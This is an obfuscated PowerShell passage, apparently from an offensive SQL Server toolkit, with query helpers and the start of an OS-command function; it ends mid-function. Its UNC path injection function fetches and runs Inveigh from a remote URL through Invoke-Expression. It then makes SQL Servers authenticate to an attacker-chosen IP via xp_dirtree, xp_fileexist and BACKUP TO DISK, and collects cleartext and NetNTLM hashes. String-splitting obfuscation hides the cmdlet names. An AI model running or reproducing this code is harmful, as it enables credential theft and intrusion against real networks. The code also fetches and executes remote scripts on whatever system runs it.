        HELPMEssaGE = {"{3}{1}{5}{2}{0}{4}" -f 'e','onnec','n tim','C','out.','tio'})]
        [int]${T`IMeo`UT},

        [Parameter(mANDATorY = ${FaL`se},
        hElPmEssAge = {"{0}{9}{2}{10}{4}{3}{7}{6}{5}{1}{8}"-f'S','app','es','  Used wh',' errors.','ion is wr','funct','en ','ed.','uppr','s verbose'})]
        [switch]${SUppR`es`S`VErBO`se},

        [Parameter(maNDATORY = ${faL`Se},
        helpMEsSAge = {"{4}{0}{1}{9}{11}{6}{8}{7}{10}{12}{15}{14}{16}{2}{13}{5}{3}" -f'e nam','e o','serve','h.','Spoof th','t','i','ati','c','f the app','on you','l','r connecting','r wi','he',' to t',' '})]
        [string]${aP`P`NAMe} = "",

        [Parameter(mAndATory = ${f`Al`sE},
        helPmEssAGe = {"{11}{0}{12}{8}{9}{3}{7}{5}{4}{6}{2}{1}{10}" -f 'of th',' server wit','ing to the','t','r conn','hostname you','ect','ion/','me of',' the worksta','h.','Spo','e na'})]
        [string]${W`oRkstA`TIon`ID} = "",

        [Parameter(maNdAtOry = ${Fal`Se},
        heLPMessAge = {"{1}{3}{4}{2}{0}"-f 'on.','Use','pted connecti',' an e','ncry'})]
        [ValidateSet("Yes","No","")]
        [string]${e`NCR`ypt} = "",

        [Parameter(mANdaTory = ${fA`lsE},
        HelpmESSaGE = {"{1}{9}{6}{0}{8}{2}{7}{3}{5}{4}"-f'fic','Trust t','e of ','e remote','.',' server','ti','th','at','he cer'})]
        [ValidateSet("Yes","No","")]
        [string]${t`RUSTServE`RCe`RT} = "",

        [Parameter(mandAtory = ${f`ALsE},
        HELpMEsSAgE = {"{4}{0}{2}{3}{5}{1}"-f'rn erro','ts.','r message if ','exi','Retu','s'})]
        [switch]${Re`TURneRr`OR}
    )

    Begin
    {
        
        ${t`B`lQueRyr`Esu`LTS} = &("{1}{2}{0}"-f'ect','Ne','w-Obj') -TypeName ("{2}{3}{4}{0}{1}" -f 'aTabl','e','Sy','st','em.Data.Dat')
    }

    Process
    {
        
        if(${d`AC})
        {
            
            ${co`N`NeCTioN} = &("{0}{1}{2}{3}"-f'Get-SQ','LCon','ne','ctionObject') -Instance ${i`N`S`TaNce} -Username ${US`eRna`Me} -Password ${pa`Ss`WOrD} -Credential ${cREdeNT`i`Al} -TimeOut ${timEO`Ut} -DAC -Database ${D`ATaba`sE} -AppName ${apP`Na`ME} -WorkstationId ${worKsta`T`I`On`id} -Encrypt ${E`NC`RYPT} -TrustServerCert ${TRuStse`RvERCE`Rt}
        }
        else
        {
            
            ${C`onN`EcTIon} = &("{1}{5}{4}{0}{2}{3}"-f 'ne','Get-S','ctionObj','ect','n','QLCo') -Instance ${iN`S`T`AncE} -Username ${uSE`RNAmE} -Password ${PAS`sWoRD} -Credential ${c`ReDen`TiAL} -TimeOut ${ti`me`OUT} -Database ${D`ATAB`ASe} -AppName ${APPN`A`ME} -WorkstationId ${wORKS`T`AtiOniD} -Encrypt ${Enc`Ry`PT} -TrustServerCert ${Tru`stse`RV`ercE`Rt}
        }

        
        ${CO`N`NEctIon`st`RinG} = ${c`oNnE`CtION}."CO`N`NecTIONsT`RI`Ng"
        ${i`Ns`Ta`NcE} = ${co`N`NeCtIo`Ns`TrI`Ng}.("{0}{1}"-f 'spli','t').Invoke(';')[0].("{0}{1}"-f'spl','it').Invoke('=')[1]

        
        if(${Qu`e`Ry})
        {
            
            try
            {
                
                ${C`onNectI`on}.("{1}{0}" -f'n','Ope').Invoke()

                if(-not ${sU`PPRess`VERBose})
                {
                    &("{2}{4}{1}{0}{3}" -f 's','bo','Write-Ve','e','r') -Message ("$Instance "+': '+'Conn'+'ectio'+'n '+'Succe'+'s'+'s.')
                }

                
                ${C`OMMa`ND} = &("{2}{1}{0}" -f 'ject','w-Ob','Ne') -TypeName ("{7}{4}{0}{1}{6}{2}{5}{3}" -f 'stem.Data','.S','C','d','y','lient.SqlComman','ql','S') -ArgumentList (${Q`UERy}, ${C`o`NNeCt`ioN})

                
                ${rES`U`lTS} = ${COmM`AnD}.("{4}{2}{3}{0}{1}" -f'ad','er','teR','e','Execu').Invoke()

                
                ${tB`lQUeR`yRe`suL`Ts}.("{1}{0}"-f'ad','Lo').Invoke(${REsu`l`TS})

                
                ${c`oNN`ECtI`ON}.("{1}{0}" -f 'lose','C').Invoke()

                
                ${Co`NnEc`TIOn}.("{1}{0}" -f 'pose','Dis').Invoke()
            }
            catch
            {
                
                if(-not ${sUp`pRESs`V`eRbOse})
                {
                    &("{0}{2}{1}" -f 'Wr','Verbose','ite-') -Message ("$Instance "+': '+'Co'+'nn'+'ec'+'tion '+'Failed'+'.')
                }

                if(${reTu`RNe`R`ROR})
                {
                    ${e`RRorme`s`S`Age} = ${_}."Exc`EP`TIOn"."ME`sS`Age"
                    
                }
            }
        }
        else
        {
            &("{0}{3}{2}{1}"-f 'W','e-Host','it','r') -InputObject ("{0}{8}{7}{5}{4}{2}{9}{3}{1}{6}" -f 'No q','i','rovided to G',' funct',' p','ry','on.','e','u','et-SQLQuery')
            Break
        }
    }

    End
    {
        
        if(${reT`UrN`ErRor})
        {
            ${ER`R`o`RMes`sage}
        }
        else
        {
            ${t`BlQUe`RYreSUL`Ts}
        }
    }
}






Function  ge`T-`sQlq`UEryTHREadED
{
    
    [CmdletBinding()]
    Param(
        [Parameter(MaNdATORY = ${F`ALsE},
        HeLPmESsAGe = {"{2}{1}{10}{5}{11}{0}{9}{12}{4}{8}{6}{7}{3}"-f'cc',' ','SQL Server or','h.','hent','ma','ate w','it','ic','ount to ','do','in a','aut'})]
        [string]${uS`ERNaME},

        [Parameter(MAndatory = ${F`AlsE},
        HELpMeSSagE = {"{8}{7}{11}{0}{5}{14}{4}{12}{3}{9}{1}{6}{13}{2}{10}"-f ' d','rd to auth',' with','pas','n acc','oma','e',' Server o','SQL','swo','.','r','ount ','nticate','i'})]
        [string]${PA`sS`word},

        [Parameter(maNDAtOrY = ${F`ALSE},
        heLPmeSSaGE = {"{3}{4}{2}{1}{0}" -f'.','dentials','e','Windows c','r'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${CRE`DE`NtiAl} =   $0459M2::"E`mpTY",

        [Parameter(MAndATORy = ${F`A`LsE},
                VALUefROMPipElINe = ${Tr`Ue},
                VAluEFrompipElInebyPRopERtynAmE = ${t`RUE},
        HelPMESsaGe = {"{4}{0}{5}{2}{7}{1}{8}{6}{3}" -f ' Serve','nec',' instance to c','.','SQL','r','ion to','on','t'})]
        [string]${inS`T`An`Ce},

        [Parameter(MandaTorY = ${F`Alse},
        hELPMEsSaGe = {"{6}{2}{4}{5}{0}{1}{3}{7}"-f'icated A','dm','onnect','in Co',' us','ing Ded','C','nnection.'})]
        [Switch]${D`Ac},

        [Parameter(MAnDATOry = ${F`A`lSe},
        HeLpmEsSaGe = {"{6}{7}{3}{1}{4}{8}{9}{5}{2}{0}" -f 'to.','atabas','onnect ','ult d','e ',' c','De','fa','t','o'})]
        [String]${d`A`TabAse},

        [Parameter(ManDaToRy = ${t`RuE},
        HElpmEssAgE = {"{4}{0}{1}{2}{3}"-f 'uery ','to be ','executed','.','Q'})]
        [String]${qu`ERy},

        [Parameter(mANdatoRy = ${FaL`se},
        HeLpmesSagE = {"{3}{1}{0}{4}{2}"-f 'i','n t','.','Connectio','meout'})]
        [string]${TI`m`EoUT},

        [Parameter(MaNdaTORY = ${fa`LSE},
        HELpMeSSAGe = {"{2}{3}{4}{1}{0}" -f' threads.','f','N','um','ber o'})]
        [int]${t`hrEa`Ds} = 5,

        [Parameter(MAnDATOry = ${FA`LSe},
        helpmEsSaGE = {"{8}{9}{5}{4}{1}{0}{7}{2}{3}{6}" -f ' w','.  Used','en function is w','rappe','e errors','ss verbos','d.','h','S','uppre'})]
        [switch]${s`UpPr`ESs`Ver`BosE}
    )

    Begin
    {
        
        ${tbl`R`eSULts} = &("{1}{2}{0}"-f'ect','Ne','w-Obj') -TypeName ("{6}{4}{2}{0}{3}{5}{1}"-f 'D','.DataTable','.','at','em','a','Syst')

        
        ${piP`elinei`T`eMs} = &("{3}{0}{2}{1}" -f 'ew-','bject','O','N') -TypeName ("{0}{1}{4}{2}{3}" -f 'Syste','m.Data.Da','aTabl','e','t')

        
        if(-not ${In`S`TANCe})
        {
            ${i`N`sTancE} = ${e`NV:C`oMPUtE`RNamE}
        }

        
        if(${In`st`A`Nce})
        {
            ${ProVidEins`T`A`NcE} = &("{2}{1}{0}"-f'ct','ew-Obje','N') -TypeName ("{0}{1}{2}" -f 'PS','Ob','ject') -Property @{
                ("{0}{1}{2}" -f'In','stan','ce') = ${iNs`T`ANcE}
            }
        }

        
        ${p`I`P`ELINeItemS} = ${PIP`elInEiTE`Ms} + ${PR`o`V`ideINs`TAnCE}
    }

    Process
    {
        
        ${piPeLi`NE`i`T`EMs} = ${Pip`E`LINE`itEMs} + ${_}
    }

    End
    {
        
        ${mys`cR`IpTb`LOck} = {
            ${I`NS`TAnCE} = ${_}."insTAN`CE"

            
            ${co`MpUt`ERName} = &("{7}{3}{6}{1}{4}{8}{2}{5}{0}"-f 'ance','omp','me','et-','uterN','FromInst','C','G','a') -Instance ${iNst`An`cE}

            
            if(${d`AC})
            {
                
                ${c`onNeCt`i`on} = &("{2}{1}{5}{4}{0}{3}" -f 'e','L','Get-SQ','ct','ctionObj','Conne') -Instance ${i`Nsta`N`CE} -Username ${uS`Er`NAme} -Password ${paS`S`Word} -Credential ${Cr`e`DE`NtIAL} -DAC -TimeOut ${T`I`mEOut} -Database ${DAtAB`A`SE}
            }
            else
            {
                
                ${c`O`N`Nection} = &("{1}{5}{3}{4}{2}{0}"-f 'ect','Get','nectionObj','LCo','n','-SQ') -Instance ${iNSt`AN`cE} -Username ${u`SeRnA`ME} -Password ${paSs`w`ORD} -Credential ${cRe`dEN`TIal} -TimeOut ${t`imE`OUt} -Database ${Da`TaBasE}
            }

            
            try
            {
                
                ${co`NNectI`oN}.("{1}{0}" -f'n','Ope').Invoke()

                if(-not ${SU`PpReSS`V`E`RBosE})
                {
                    &("{0}{4}{2}{1}{3}" -f'Wri','s','Verbo','e','te-') -Message ("$Instance "+': '+'Conn'+'ect'+'io'+'n '+'Suc'+'cess.')
                }

                
                ${Com`maNd} = &("{0}{2}{1}"-f 'Ne','-Object','w') -TypeName ("{6}{8}{0}{2}{3}{7}{4}{5}{1}" -f '.','qlCommand','Data.SqlC','l','ent.','S','Sy','i','stem') -ArgumentList (${q`UERy}, ${cON`Ne`cT`iON})

                
                ${reS`U`lTs} = ${C`O`mManD}.("{0}{2}{1}"-f'Exe','der','cuteRea').Invoke()

                
                ${Tb`LrE`SUlTS}.("{1}{0}" -f 'd','Loa').Invoke(${R`eSUl`TS})

                
                ${co`NN`E`CtIon}.("{0}{1}"-f'Cl','ose').Invoke()

                
                ${coNN`e`ct`Ion}.("{1}{0}{2}"-f 'ispos','D','e').Invoke()
            }
            catch
            {
                

                if(-not ${sUPp`RESs`V`erbOsE})
                {
                    ${eRRor`MESS`A`gE} = ${_}."eXce`p`TIoN"."m`eSs`Age"
                    &("{0}{2}{1}"-f'Write','e','-Verbos') -Message ("$Instance "+': '+'Co'+'nnec'+'tion '+'Fai'+'led.')
                    
                }

                
                ${n`ULl} = ${TBlr`eSU`LTS}."Ro`ws".("{1}{0}" -f 'dd','A').Invoke("$ComputerName","$Instance",("{0}{3}{1}{2}"-f 'No',' Access','ible','t'))
            }
        }

        
        ${pIpe`lIN`EiT`eMs} | &("{2}{0}{1}"-f 'voke','-Parallel','In') -ScriptBlock ${m`Y`sc`RIPTbLOCk} -ImportSessionFunctions -ImportVariables -Throttle ${T`h`REAdS} -RunspaceTimeout 2 -Quiet -ErrorAction ("{0}{1}{3}{2}"-f'Silent','ly','inue','Cont')

        return ${t`Blre`Sults}
    }
}















Function I`N`VokE-sqLUNcPaTHi`NjECTi`on {

    

    [CmdletBinding()]
    Param(
      [Parameter(mAndaTOry=${F`AL`sE})]
       [string]${u`seRna`me},
    
       [Parameter(MAndAtory=${F`A`LSe})]
       [string]${pA`sSw`O`Rd},

       [Parameter(MANdatOrY=${F`AL`SE})]
       [string]${DOMa`i`NconTRo`LL`eR},

       [Parameter(MANdATorY = ${F`AlSe},
                VALuEfRoMPIPeliNe = ${T`Rue},
                vAluEfrOmPIpElINEBYPRoPerTynAmE = ${T`Rue},
       HELPmessAgE = {"{3}{1}{0}{8}{2}{4}{7}{6}{5}"-f 'tanc',' Server ins',' to co','SQL','nnec','o.','t','tion ','e'})]
       [string]${I`NstAN`Ce},

       [Parameter(mAnDAtOrY=${t`RUE})]
       [string]${cA`Ptur`EIP},

       [Parameter(MANDaTORy=${Fa`Lse})]
       [int]${T`im`EoUT} = 5,

       [Parameter(mAnDATOry=${F`AlSe})]
       [int]${T`HREA`ds} = 10

    )

    Begin 
    {
        
        try {
            &("{3}{0}{2}{1}" -f'E','n','xpressio','Invoke-') -Command (&("{1}{0}{2}" -f 'c','New-Obje','t') -TypeName ("{2}{1}{3}{0}"-f'client','t','system.ne','.web')).("{3}{2}{1}{0}"-f 'ng','nloadstri','w','do').Invoke(("{1}{0}{12}{14}{16}{13}{5}{6}{8}{17}{4}{2}{7}{9}{3}{11}{10}{15}"-f'ps:/','htt','/Inveigh','ster/Inve','vin-Robertson','te','nt.c','/','om/','ma','ps','igh.','/raw','sercon','.g','1','ithubu','Ke')) -ErrorAction ("{0}{1}" -f 'S','top')
            &("{2}{1}{0}{3}"-f 'e-Ve','rit','W','rbose') ("{3}{1}{2}{0}"-f'd','oa','de','Inveigh l')
        } catch {
            ${ERRORMe`s`Sage} = ${_}."excEp`TIoN"."Me`sSa`Ge"
            &("{4}{3}{1}{2}{0}" -f'ose','te-Ve','rb','i','Wr') "$ErrorMessage"

            
            ${L`o`Aded} = &("{1}{2}{0}"-f 'h','Tes','t-Pat') -Path (("{0}{2}{3}{1}{5}{4}"-f'F','NDh','unctio','n:','oke-Inveigh','Inv'))."R`EPlacE"(([cHAr]78+[cHAr]68+[cHAr]104),'\')
            if(${LOaD`ED} -eq ("{0}{1}"-f 'Tr','ue'))
            {
                &("{1}{2}{0}" -f 'se','Write','-Verbo') ("{0}{1}{2}{3}"-f 'I','nveigh ','loade','d.')
            }else{
                &("{2}{1}{0}"-f 'e','-Verbos','Write') ("{1}{4}{6}{9}{0}{11}{7}{10}{2}{3}{8}{5}"-f 'd. ','In','ure I','nveig','veigh NOT loa',' is loaded.','d','n','h','e','s','E')
                break
            }
        }

        
        ${t`B`lIn`VeigH} = &("{0}{1}{2}" -f 'Ne','w-Objec','t') -TypeName ("{2}{0}{3}{1}{4}"-f 'tem.Data.','l','Sys','DataTab','e')
        ${n`ULL} = ${tBL`In`V`EiGH}."colu`m`NS".("{0}{1}"-f 'A','dd').Invoke(("{1}{0}"-f 'xt','Clearte'))
        ${n`UlL} = ${T`B`li`NVeIgh}."co`luM`Ns".("{1}{0}"-f'dd','A').Invoke(("{0}{2}{1}" -f 'Ne','Mv1','tNTL'))
        ${nu`LL} = ${tb`lINV`EI`gh}."cOlum`NS".("{0}{1}" -f'Ad','d').Invoke(("{0}{1}{2}"-f 'NetNTL','Mv','2'))
    }

    Process
    {

        
        
        ${cUrREnT`IDE`N`Ti`Ty} =  (Get-itEm vaRIable:uTnJP ).vAlUE::("{1}{2}{0}" -f'rent','Get','Cur').Invoke()
        ${P`RP} = &("{2}{1}{0}" -f'ct','ew-Obje','N') -TypeName ("{7}{2}{11}{1}{8}{6}{3}{4}{10}{9}{0}{5}" -f'i','p','em.Security.Princ','i','ndo','pal','l.W','Syst','a','Princ','ws','i') -ArgumentList (${C`U`RR`enTidEnTI`TY})                        
        ${a`DM} =   $Mgi::"A`dmI`NiStR`ATOR"
        ${isad`Min} = ${P`RP}.("{0}{1}" -f 'IsInRo','le').Invoke(${a`Dm})
        if (-not ${ISAd`m`iN})
        {
            &("{4}{2}{1}{0}{3}" -f 'rb','-Ve','rite','ose','W') -Message ("{2}{10}{17}{3}{14}{4}{21}{20}{12}{5}{15}{9}{1}{8}{6}{7}{0}{11}{16}{18}{13}{22}{19}" -f'o','ion ','You do','dm','strator righ',' this fun','n a privileged ','pr','i','t',' not have ','ces','Run','t res','ini','c','s for','A',' bes','s.','s. ','t','ult')                            
        }
        else
        {
            &("{0}{2}{1}{3}{4}"-f'Wr','Verbo','ite-','s','e') -Message ("{5}{2}{4}{3}{0}{6}{1}{7}"-f'inistra','or','hav','dm','e A','You ','t',' rights.')
                          
        }

        
        if(-not ${i`NST`ANCe})
        {
            
            ${sQ`lsERVEr`in`sT`A`N`CES} = &("{1}{5}{3}{4}{0}{2}"-f'c','Get-SQLIns','eDomain','a','n','t') -verbose -DomainController ${dO`M`AinCON`TrO`ller} -Username ${Use`RN`AME} -Password ${p`ASsWOrD} 
        } else {
            
            ${S`q`L`s`eR`VeRiNstaNces} = ${in`sTa`Nce} 
        }

        
        &("{1}{3}{2}{0}" -f'e','Write-V','rbos','e') -Message ("{5}{1}{4}{3}{6}{7}{0}{2}" -f 'instanc','ting','e...',' log into e',' to','Attemp','ach',' ')
        ${aCC`e`sSib`LesqlSer`VERs} = ${s`qlserVE`RiNsT`An`Ces} | &("{1}{4}{6}{0}{7}{5}{3}{8}{2}"-f'LCo','Get-','ed','onTestThrea','S','cti','Q','nne','d') -Verbose -Threads ${T`HREAdS} | &('?') {${_}."STA`Tus" -eq ("{3}{1}{0}{2}"-f 'b','cessi','le','Ac')}        
        ${aCCEsSiBlESqLs`E`Rv`ERSco`Unt} = ${aC`CessIbl`e`sqL`SeR`VErS}."Cou`Nt"

        
        &("{2}{0}{1}"-f '-Ver','bose','Write') -Message ("$AccessibleSQLServersCount "+'SQL'+' '+'Server'+' '+'ins'+'tance'+'s'+' '+'c'+'an '+'be'+' '+'logg'+'e'+'d '+'int'+'o')
        &("{1}{3}{2}{0}{4}" -f'rb','Wri','-Ve','te','ose') -Message ('Startin'+'g'+' '+'UNC'+' '+'pa'+'th '+'i'+'nject'+'ions '+'a'+'gain'+'st '+"$AccessibleSQLServersCount "+'instan'+'ces.'+'.'+'.')

        
        &("{2}{0}{1}"-f'te-Ve','rbose','Wri') -Message ("{6}{4}{1}{5}{2}{0}{3}"-f 'h..','art','voke-Inveig','.','t','ing In','S')
        &("{0}{2}{1}"-f 'Invo','gh','ke-Invei') -NBNS ('Y') -MachineAccounts ('Y') -IP ${C`ApT`UReiP} | &("{0}{1}{2}"-f 'Ou','t-Nu','ll')

        
        ${acC`ES`SIblesq`lserVE`Rs} | 
        &("{3}{0}{1}{2}"-f 'ch-Ob','j','ect','ForEa'){

            
            ${C`UrREN`T`INstANCE} = ${_}."Ins`Tan`cE"

            
            ${u`NcF`i`LeNAME} = (-join ((65..90) + (97..122) | &("{2}{1}{0}" -f 'Random','-','Get') -Count 5 | &('%') {[char]${_}}))

            
            &("{2}{0}{1}" -f't','e-Verbose','Wri') -Message ("$CurrentInstance "+'- '+'I'+'nj'+'ecting '+'UNC'+' '+'p'+'ath '+'t'+'o '+"\\$CaptureIp\$UncFileName")

            
            

            
            ${sQ`L`VeRSIonfuLl} = &("{3}{2}{0}{4}{1}"-f '-S','o','et','G','QLServerInf') -Instance ${CUr`RenT`INSt`ANCE} -Username ${UsernA`Me} -Password ${PAs`SwoRD} -SuppressVerbose | &("{0}{1}{2}"-f 'Sel','ect-Obje','ct') -Property ("{0}{2}{5}{1}{3}{6}{4}" -f'SQLS','erV','er','e','sionNumber','v','r') -ExpandProperty ("{3}{2}{0}{1}{4}" -f 'rVe','rsio','rve','SQLSe','nNumber')
            if(${sQ`LvER`SiOnFU`LL})
            {
                ${SQL`V`ERsiO`NS`hoRT} = ${sqlV`E`Rsi`ONfulL}.("{1}{0}"-f 'it','Spl').Invoke('.')[0]
            }

            
            if([int]${SqlvE`R`SiO`NshorT} -le 11)
            {
                &("{1}{2}{0}"-f'y','Get-SQL','Quer') -Instance ${C`U`RreN`T`iNSTaNCe} -Username ${U`s`ErNaMe} -Password ${p`Assw`OrD} -Query ('BA'+'CKU'+'P '+'LOG'+' '+'[TE'+'S'+'TIN'+'G] '+'T'+'O '+'DI'+'SK '+'= '+"'\\$CaptureIp\$UncFileName'") -SuppressVerbose | &("{0}{2}{1}" -f'o','ll','ut-nu')
                &("{2}{1}{0}"-f 'SQLQuery','-','Get') -Instance ${c`U`Rr`EnTIn`sTANcE} -Username ${UsE`RN`A`ME} -Password ${pAsSW`O`Rd} -Query ('BAC'+'KU'+'P '+'DATA'+'BAS'+'E '+'['+'TEST'+'IN'+'G] '+'TO'+' '+'DIS'+'K '+'= '+"'\\$CaptureIp\$UncFileName'") -SuppressVerbose | &("{1}{2}{0}" -f'l','o','ut-nul')
            }

            
            &("{2}{0}{1}" -f '-SQLQ','uery','Get') -Instance ${CUrr`EntInS`Ta`NCE} -Username ${US`ErNA`mE} -Password ${P`AS`sWORD} -Query ('xp_d'+'irtr'+'ee '+"'\\$CaptureIp\$UncFileName'") -SuppressVerbose | &("{2}{1}{0}" -f'l','nul','out-') 
            &("{0}{1}{2}{3}"-f'Ge','t-SQL','Que','ry') -Instance ${Cu`Rr`EN`Tins`TAnCe} -Username ${U`Sern`AMe} -Password ${P`AsSwOrd} -Query ('xp_file'+'e'+'xist'+' '+"'\\$CaptureIp\$UncFileName'") -SuppressVerbose | &("{0}{2}{1}"-f 'out','l','-nul')
   
            
            &("{1}{0}"-f'p','slee') ${tIMe`Out}

            
            &("{0}{2}{3}{1}"-f'Get-','igh','Inv','e') -Cleartext | &("{2}{1}{0}" -f 'ject','ort-Ob','S') |
            &("{2}{0}{1}" -f'b','ject','ForEach-O') {
                &("{2}{0}{1}" -f 'e','rbose','Write-V') -Message (' '+'- '+'Cle'+'art'+'ext'+': '+"$_")
            }

            &("{0}{1}{3}{2}"-f 'G','e','-Inveigh','t') -NTLMv1 | &("{3}{1}{0}{2}" -f'jec','b','t','Sort-O') |
            &("{1}{4}{3}{2}{0}" -f 't','F','bjec','Each-O','or') {
                &("{2}{0}{1}{3}"-f'rite-V','erbo','W','se') -Message (' '+'- '+'NetNTLM'+'v1:'+' '+"$_")
            }

            &("{3}{0}{2}{1}"-f'-','gh','Invei','Get') -NTLMv2 | &("{2}{1}{0}"-f't','jec','Sort-Ob') |
            &("{1}{0}{2}"-f 'rEach-','Fo','Object') {
                &("{4}{0}{1}{3}{2}" -f't','e','se','-Verbo','Wri') -Message (' '+'- '+'Ne'+'tNTLMv2:'+' '+"$_")
            }
        }
    }

    End
    {

            
            &("{2}{1}{0}"-f 'eigh','v','Get-In') -Cleartext | &("{2}{3}{0}{1}"-f'Ob','ject','Sort','-') |
            &("{3}{2}{1}{0}" -f'ject','b','rEach-O','Fo') {
                
                
                [string]${n`T`Lmv1} = ""
                [string]${N`TLm`V2} = ""
                [string]${Clea`RT`eXT} = ${_}
                ${n`UlL} = ${tb`LIN`VeIGH}."RO`Ws"."a`dD"([string]${clEAR`T`E`xT}, [string]${NT`l`mV1}, [string]${N`T`LMv2})            
            }

            
            &("{0}{1}{2}"-f 'Get','-','Inveigh') -NTLMv1 | &("{0}{2}{3}{1}" -f'S','Object','o','rt-') |
            &("{0}{2}{1}" -f'ForE','Object','ach-') {
                
                
                [string]${nt`lMV1} = ${_}
                [string]${Nt`LM`V2} = ""
                [string]${C`leART`E`xT} = ""
                ${n`ULl} = ${T`BLINVe`I`gH}."ro`Ws"."a`DD"([string]${cLEA`RtE`Xt}, [string]${NtL`mV1}, [string]${nt`lM`V2})            
            }

            
            &("{1}{0}{2}" -f 't-Inveig','Ge','h') -NTLMv2 | &("{0}{2}{1}"-f'S','ject','ort-Ob') |
            &("{4}{1}{0}{2}{3}"-f'Obj','orEach-','ec','t','F') {
                
                
                [string]${N`Tlm`V1} = ""
                [string]${nt`LM`V2} = ${_}
                [string]${cLeaR`T`eXt} = ""
                ${n`Ull} = ${TB`Li`Nve`IGh}."r`Ows"."A`Dd"([string]${cL`eARt`EXT}, [string]${NT`Lm`V1}, [string]${N`TLm`V2})            
            }

        
        &("{3}{1}{0}{2}" -f'Inve','lear-','igh','C') | &("{0}{2}{1}"-f'Out-N','ll','u')

        
        &("{1}{0}{3}{2}"-f'-In','Stop','eigh','v') | &("{1}{0}{2}" -f'l','Out-Nu','l')
        
        
        ${TB`lI`NVEIGh}

    }
}






Function  iNv`oKE-S`qL`os`cmd
{
    
    [CmdletBinding()]
    Param(
        [Parameter(ManDATORY = ${FAl`se},
        HElpmesSaGE = {"{8}{7}{4}{1}{2}{6}{3}{0}{5}"-f'hent','ain ac','count',' aut',' dom','icate with.',' to','r','SQL Server o'})]
        [string]${Us`eRNAmE},

        [Parameter(manDAtoRy = ${Fa`L`SE},
        helPmeSsaGE = {"{1}{2}{13}{14}{4}{10}{0}{9}{8}{12}{3}{6}{7}{5}{11}" -f ' domain','SQL ','S','s','o','cate with','sword to authent','i','a',' ','r','.','ccount pa','erver',' '})]
        [string]${P`A`SswOrD},

        [Parameter(mandaToRY = ${fA`LsE},
        hELPMEsSagE = {"{1}{3}{2}{0}" -f 'ls.','Wind','a','ows credenti'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${CRE`D`En`Tial} =  $0459m2::"eMp`TY",

        [Parameter(MANDaTORY = ${f`AlsE},
                valUeFromPipELINe = ${tr`UE},
                VAlUEFRompipelINebYPrOPeRTYnaME = ${tR`UE},
        hElpmessaGE = {"{6}{7}{2}{5}{4}{3}{0}{1}" -f 'ection ','to.','in',' conn','to','stance ','SQL',' Server '})]
        [string]${I`NSTAn`CE},

        [Parameter(MANDATory = ${f`ALsE},
        HeLPMESSAgE = {"{3}{5}{8}{1}{4}{6}{0}{7}{2}" -f'ect','ted Admin ','on.','Conn','Co','ect using Dedic','nn','i','a'})]
        [Switch]${d`Ac},

        [Parameter(MAnDAtOry = ${t`RUe},
        HelPmESSAge = {"{2}{3}{4}{1}{0}{5}" -f' to b','d','OS comm','a','n','e executed.'})]
        [String]${COm`m`AnD},

        [Parameter(MaNDatOry = ${F`ALSe},
        HeLpmESsaGe = {"{0}{1}{2}{3}" -f 'Connect','i','on ','timeout.'})]
        [string]${t`I`mEOUt},

        [Parameter(mAndaTORY = ${fA`lsE},
        HElpMeSSagE = {"{0}{1}{2}{3}" -f'Number of ','t','h','reads.'})]
        [int]${T`hR`EADS} = 1,

        [Parameter(MaNDaTory = ${F`A`LSE},
        HElPmessaGE = {"{12}{6}{5}{10}{2}{8}{9}{1}{7}{13}{4}{0}{11}{3}"-f 's ','e','o','pped.','tion i','ess ve','pr','d when fu','se error','s.  Us','rb','wra','Sup','nc'})]
        [switch]${supp`RESSVE`Rbo`SE},

        [Parameter(mANDAtOry = ${f`A`lSe},
        HElPmessaGe = {"{5}{1}{4}{6}{3}{7}{8}{9}{11}{0}{10}{2}" -f ' ins','how t','.','aw re','he','Just s',' r','sults without t','he',' comp','tance name','uter or'})]
        [switch]${RAw`RES`U`LTs}
    )

    Begin
    {
        
        ${tBlc`Omman`ds} = &("{2}{0}{1}"-f 'e','ct','New-Obj') -TypeName ("{1}{2}{0}{4}{3}"-f 'at','System.Da','ta.D','e','aTabl')
        ${TbLRe`SU`lTS} = &("{0}{1}{2}"-f 'Ne','w-O','bject') -TypeName ("{3}{2}{0}{4}{5}{1}" -f'm','le','ste','Sy','.Data.Da','taTab')
        ${N`Ull} = ${tBLr`e`SU`LTs}."co`L`UmNs".("{1}{0}" -f 'dd','A').Invoke(("{2}{0}{3}{1}" -f'mput','Name','Co','er'))
        ${n`ULl} = ${tb`lr`esuLTS}."Col`Um`Ns".("{0}{1}" -f'A','dd').Invoke(("{0}{1}"-f 'I','nstance'))
        ${n`ULL} = ${tBLR`esUL`TS}."c`Ol`UmNs".("{0}{1}" -f 'A','dd').Invoke(("{1}{2}{0}" -f 'ts','CommandR','esul'))


        
        ${pi`pE`lin`e`ITEMS} = &("{1}{2}{0}" -f'ect','N','ew-Obj') -TypeName ("{0}{3}{1}{2}" -f'Syste','Da','taTable','m.Data.')

        
        if(-not ${insTa`N`ce})
        {
            ${iNs`Ta`NCE} = ${e`NV:c`Om`p`UtE`RNamE}
        }

        
        if(${In`staN`cE})
        {
            ${pR`OVide`IN`ST`AncE} = &("{0}{2}{1}" -f 'Ne','ect','w-Obj') -TypeName ("{2}{1}{0}"-f'ct','SObje','P') -Property @{
                ("{0}{2}{1}"-f 'I','ance','nst') = ${InSt`A`NcE}
            }
        }

        
        ${piP`E`l`IneitEMS} = ${PI`pEL`ineITe`ms} + ${prov`id`e`inS`TanCE}
    }

    Process
    {
        
        ${p`IPElINEITE`Ms} = ${PIpEli`NE`i`TEMS} + ${_}
    }

    End
    {
        
        ${my`S`cR`IPtB`Lock} = {
            ${in`stAn`cE} = ${_}."I`NStaNcE"

            
            ${comPUt`e`RN`Ame} = &("{2}{0}{3}{1}{6}{5}{4}"-f 'meF','m','Get-ComputerNa','ro','ance','t','Ins') -Instance ${ins`Tan`CE}

            
            if(-not ${InsTa`N`cE})
            {
                ${In`stAN`ce} = ${e`NV`:COm`p`Ut`Ername}
            }

            
            if(${d`Ac})
            {
                
                ${co`N`NecTioN} = &("{3}{4}{1}{2}{0}" -f 'ect','ionO','bj','Get-SQLConnec','t') -Instance ${IN`st`ANCe} -Username ${UsE`RN`AME} -Password ${pAS`SWo`Rd} -Credential ${cR`ED`EntIal} -DAC -TimeOut ${TiMEO`UT}
            }
            else
            {
                
                ${Co`N`NEcTiOn} = &("{3}{0}{4}{1}{2}" -f'nnec','e','ct','Get-SQLCo','tionObj') -Instance ${iN`stAN`Ce} -Username ${uS`e`RNa`mE} -Password ${pASS`wO`Rd} -Credential ${C`ReDE`NtIAl} -TimeOut ${TIM`E`out}
            }

            
